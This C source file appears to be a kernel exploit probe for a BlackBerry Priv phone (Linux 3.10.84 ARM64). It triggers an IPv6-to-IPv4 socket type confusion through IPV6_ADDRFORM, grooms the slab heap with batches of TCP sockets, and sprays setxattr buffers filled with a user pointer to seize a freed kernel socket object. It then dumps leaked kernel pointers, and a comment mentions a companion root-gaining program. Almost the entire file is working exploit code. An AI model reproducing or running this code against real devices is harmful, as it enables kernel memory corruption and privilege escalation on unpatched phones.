/*
 * struct_probe.c — WrongZone spray test for BB Priv (3.10.84 ARM64)
 *
 * Key insight: setxattr spray size must produce ORDER-0 pages (4096 bytes)
 * to be recyclable by TCPv6 SLUB cache. Using 32KB setxattr creates
 * order-3 blocks that won't be split for SLUB's order-0 needs.
 *
 * Cross-compile:
 *   aarch64-linux-musl-gcc -static -O2 -o struct_probe struct_probe.c -lpthread
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/xattr.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#define PAGE_SIZE 4096
#define SPRAY_SIZE PAGE_SIZE    /* Use page-sized spray for order-0 recycling */
#define SPRAY_SOCKETS 128       /* More pre-spray to exhaust partials */
#define DUPS 500
#define SPRAY_THREADS 7
#define DEFRAG_COUNT 16         /* More defrag for better page emptying */

static volatile int spray_running = 0;

/* Multiple spray buffers for different sizes */
static char spray_buf_4k[PAGE_SIZE] __attribute__((aligned(PAGE_SIZE)));
static char spray_buf_2k[2048];

struct spray_args {
    void *evil_mem;
    int size;       /* spray allocation size */
};

static void *spray_thread(void *arg) {
    struct spray_args *sa = (struct spray_args *)arg;
    (void)sa;
    while (spray_running) {
        /* XATTR_REPLACE on non-existent key: kernel allocates buffer,
         * copies data, tries xattr op (fails), frees buffer.
         * The alloc+free pushes pages through buddy allocator. */
        setxattr("/data/local/tmp", "user.spray", spray_buf_4k, PAGE_SIZE, XATTR_REPLACE);
    }
    return NULL;
}

/* Also try spraying with sendmsg ancillary data */
static void *spray_thread_sendmsg(void *arg) {
    /* Use multiple setxattr sizes to hit different slab caches */
    while (spray_running) {
        setxattr("/data/local/tmp", "user.s1", spray_buf_4k, PAGE_SIZE, XATTR_REPLACE);
        setxattr("/data/local/tmp", "user.s2", spray_buf_2k, 2048, XATTR_REPLACE);
        setxattr("/data/local/tmp", "user.s3", spray_buf_4k, 1024, XATTR_REPLACE);
    }
    return NULL;
}

/* Attempt the WrongZone + spray */
static int attempt_spray(int attempt_num, int base_port) {
    int port1 = base_port;
    int port2 = base_port + 1;
    int ret;

    printf("\n--- Attempt %d (ports %d/%d) ---\n", attempt_num, port1, port2);

    /* Create evil memory page */
    void *evil_mem = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                          MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (evil_mem == MAP_FAILED) { perror("mmap"); return -1; }

    memset(evil_mem, 0, PAGE_SIZE);
    *(uint64_t *)evil_mem = 0xDEADBEEFDEADBEEFULL;

    /* Fill ALL spray buffers with evil_mem pointer */
    for (int i = 0; i < PAGE_SIZE / 8; i++)
        *(uint64_t *)(spray_buf_4k + 8 * i) = (uint64_t)evil_mem;
    for (int i = 0; i < 2048 / 8; i++)
        *(uint64_t *)(spray_buf_2k + 8 * i) = (uint64_t)evil_mem;

    /* Start spray threads — mix of sizes for broader page coverage */
    pthread_t threads[SPRAY_THREADS];
    spray_running = 1;
    int n_threads = 0;
    for (int i = 0; i < SPRAY_THREADS; i++) {
        void *(*fn)(void *) = (i < 4) ? spray_thread : spray_thread_sendmsg;
        if (pthread_create(&threads[i], NULL, fn, NULL) == 0)
            n_threads++;
    }
    printf("  %d spray threads started\n", n_threads);

    /* Pin to CPU 0 */
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(0, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);

    /* === Create WrongZone socket === */
    int srv_fd = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
    if (srv_fd < 0) { perror("socket6"); goto fail; }

    int opt = 1;
    setsockopt(srv_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in6 bind6 = {0};
    bind6.sin6_family = AF_INET6;
    bind6.sin6_port = htons(port1);

    if (bind(srv_fd, (struct sockaddr *)&bind6, sizeof(bind6)) < 0) {
        perror("bind6"); close(srv_fd); goto fail;
    }
    listen(srv_fd, 5);

    int cli1 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    struct sockaddr_in ca1 = {0};
    ca1.sin_family = AF_INET;
    ca1.sin_port = htons(port1);
    ca1.sin_addr.s_addr = inet_addr("127.0.0.1");
    connect(cli1, (struct sockaddr *)&ca1, sizeof(ca1));

    int new_fd = accept(srv_fd, NULL, NULL);
    if (new_fd < 0) { perror("accept1"); close(cli1); close(srv_fd); goto fail; }

    /* Convert to IPv4 — the WrongZone trigger */
    int af = AF_INET;
    ret = setsockopt(new_fd, SOL_IPV6, IPV6_ADDRFORM, &af, sizeof(af));
    if (ret < 0) { printf("  ADDRFORM fail\n"); close(new_fd); close(cli1); close(srv_fd); goto fail; }

    /* Disconnect + rebind */
    struct sockaddr unsp = {0};
    unsp.sa_family = AF_UNSPEC;
    connect(new_fd, &unsp, sizeof(unsp));

    struct sockaddr_in bind4 = {0};
    bind4.sin_family = AF_INET;
    bind4.sin_port = htons(port2);
    bind(new_fd, (struct sockaddr *)&bind4, sizeof(bind4));
    listen(new_fd, 5);

    int cli2 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    struct sockaddr_in ca2 = {0};
    ca2.sin_family = AF_INET;
    ca2.sin_port = htons(port2);
    ca2.sin_addr.s_addr = inet_addr("127.0.0.1");
    connect(cli2, (struct sockaddr *)&ca2, sizeof(ca2));

    int wrongzone_sk = accept(new_fd, NULL, NULL);
    if (wrongzone_sk < 0) { perror("accept2"); goto fail; }

    /* === Heap feng shui === */
    /* Pre-spray: exhaust existing slab partials */
    int run_out[SPRAY_SOCKETS];
    int n_runout = 0;
    for (int i = 0; i < SPRAY_SOCKETS; i++) {
        run_out[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (run_out[i] >= 0) n_runout++;
    }

    /* Defrag sockets — will be freed to create empty pages */
    int defrag[DEFRAG_COUNT];
    for (int i = 0; i < DEFRAG_COUNT; i++)
        defrag[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    int follow = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    /* Fill sockets to pair with defrag on same pages */
    int fill[DEFRAG_COUNT];
    for (int i = 0; i < DEFRAG_COUNT; i++)
        fill[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    printf("  Heap setup: %d run_out, %d defrag, %d fill\n",
           n_runout, DEFRAG_COUNT, DEFRAG_COUNT);

    /* Free wrongzone socket — cross-cache to TCP slab */
    close(wrongzone_sk);

    /* Free defrag + fill to empty slab pages → buddy allocator */
    for (int i = 0; i < DEFRAG_COUNT; i++) close(defrag[i]);
    for (int i = 0; i < DEFRAG_COUNT; i++) close(fill[i]);

    /* Let spray threads reclaim freed pages */
    printf("  Waiting for spray to fill freed pages...\n");
    usleep(500000);  /* 500ms - more time for page recycling */

    /* === Spray tcp6_sock to reclaim pages === */
    printf("  Allocating tcp6_sock sockets...\n");
    int dup_sks[DUPS];
    int n_dups = 0;
    int evil_sk = -1;

    for (int i = 0; i < DUPS; i++) {
        dup_sks[i] = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
        if (dup_sks[i] < 0) { dup_sks[i] = -1; continue; }
        n_dups++;

        /* Check sentinel — kernel writing to evil_mem changes it */
        if (*(volatile uint64_t *)evil_mem != 0xDEADBEEFDEADBEEFULL) {
            evil_sk = dup_sks[i];
            printf("  >>> CONTROLLED ALLOCATION at socket %d (iter %d)! <<<\n",
                   evil_sk, i);
            printf("  evil_mem[0] = 0x%016lx\n", *(uint64_t *)evil_mem);

            /* Dump first 64 qwords of evil_mem */
            for (int j = 0; j < 64; j++) {
                uint64_t val = ((volatile uint64_t *)evil_mem)[j];
                if (val != 0) {
                    const char *tag = "";
                    if ((val & 0xFFFFFF0000000000ULL) == 0xffffffc000000000ULL) tag = " KERN_LINEAR";
                    else if ((val & 0xFFFFFF0000000000ULL) == 0xffffff8000000000ULL) tag = " KERN_TEXT";
                    else if (val == (uint64_t)evil_mem) tag = " EVIL_MEM";
                    printf("    [%3d] 0x%016lx%s\n", j, val, tag);
                }
            }
            break;
        }
    }

    printf("  Created %d tcp6_sock sockets (fd_limit approached: %s)\n",
           n_dups, n_dups < DUPS ? "YES" : "no");

    if (evil_sk >= 0) {
        printf("\n  +++ SPRAY SUCCESS +++\n");
        printf("  evil_sk=%d, evil_mem=%p\n", evil_sk, evil_mem);

        /* Test: can we control the socket via evil_mem? */
        printf("  Testing socket control via evil_mem...\n");

        /* Read current evil_mem state */
        printf("  evil_mem full dump (non-zero entries):\n");
        int count = 0;
        for (int j = 0; j < PAGE_SIZE / 8; j++) {
            uint64_t val = ((volatile uint64_t *)evil_mem)[j];
            if (val != 0 && count < 32) {
                printf("    [%3d] +0x%04x: 0x%016lx\n", j, j * 8, val);
                count++;
            }
        }
    } else {
        printf("  SPRAY FAILED after %d tcp6_sock allocations\n", n_dups);

        /* Debug: check if evil_mem is intact */
        uint64_t em0 = *(volatile uint64_t *)evil_mem;
        printf("  evil_mem[0] = 0x%016lx (%s)\n", em0,
               em0 == 0xDEADBEEFDEADBEEFULL ? "sentinel intact" : "CHANGED?!");

        /* Check if any evil_mem values changed */
        int changed = 0;
        for (int j = 1; j < PAGE_SIZE / 8; j++) {
            if (((volatile uint64_t *)evil_mem)[j] != 0) {
                changed++;
            }
        }
        printf("  evil_mem non-zero entries (excluding [0]): %d\n", changed);
    }

    /* Stop spray */
    spray_running = 0;
    for (int i = 0; i < n_threads; i++) pthread_join(threads[i], NULL);

    /* Cleanup */
    for (int i = 0; i < SPRAY_SOCKETS; i++) if (run_out[i] >= 0) close(run_out[i]);
    close(follow);
    close(cli1); close(cli2); close(new_fd); close(srv_fd);
    for (int i = 0; i < DUPS; i++) {
        if (dup_sks[i] >= 0 && dup_sks[i] != evil_sk) close(dup_sks[i]);
    }
    if (evil_sk >= 0) close(evil_sk);
    munmap(evil_mem, PAGE_SIZE);

    return evil_sk >= 0 ? 0 : -1;

fail:
    spray_running = 0;
    for (int i = 0; i < n_threads; i++) pthread_join(threads[i], NULL);
    munmap(evil_mem, PAGE_SIZE);
    return -1;
}

int main(void) {
    setbuf(stdout, NULL);
    printf("=== WrongZone Exploit Probe v3 ===\n");
    printf("PID: %d  UID: %d\n\n", getpid(), getuid());

    /* Show process name — getroot.c searches for "exploit" */
    char comm[32] = {0};
    FILE *f = fopen("/proc/self/comm", "r");
    if (f) { fgets(comm, sizeof(comm), f); fclose(f); }
    printf("Process name: %s\n", comm);

    /* Try up to 3 attempts */
    for (int attempt = 0; attempt < 3; attempt++) {
        int port_base = 42420 + attempt * 10;
        if (attempt_spray(attempt, port_base) == 0) {
            printf("\n=== SPRAY SUCCEEDED ===\n");
            return 0;
        }
        printf("  (sleeping 1s before retry)\n");
        sleep(1);
    }

    printf("\n=== All attempts failed ===\n");
    printf("Possible issues:\n");
    printf("  - Spray order mismatch (kmalloc cache vs SLUB page order)\n");
    printf("  - SLUB zeroing objects (__GFP_ZERO in sk_alloc)\n");
    printf("  - Not enough memory pressure for page recycling\n");
    printf("  - Need firmware kernel symbols for direct approach\n");
    return 1;
}
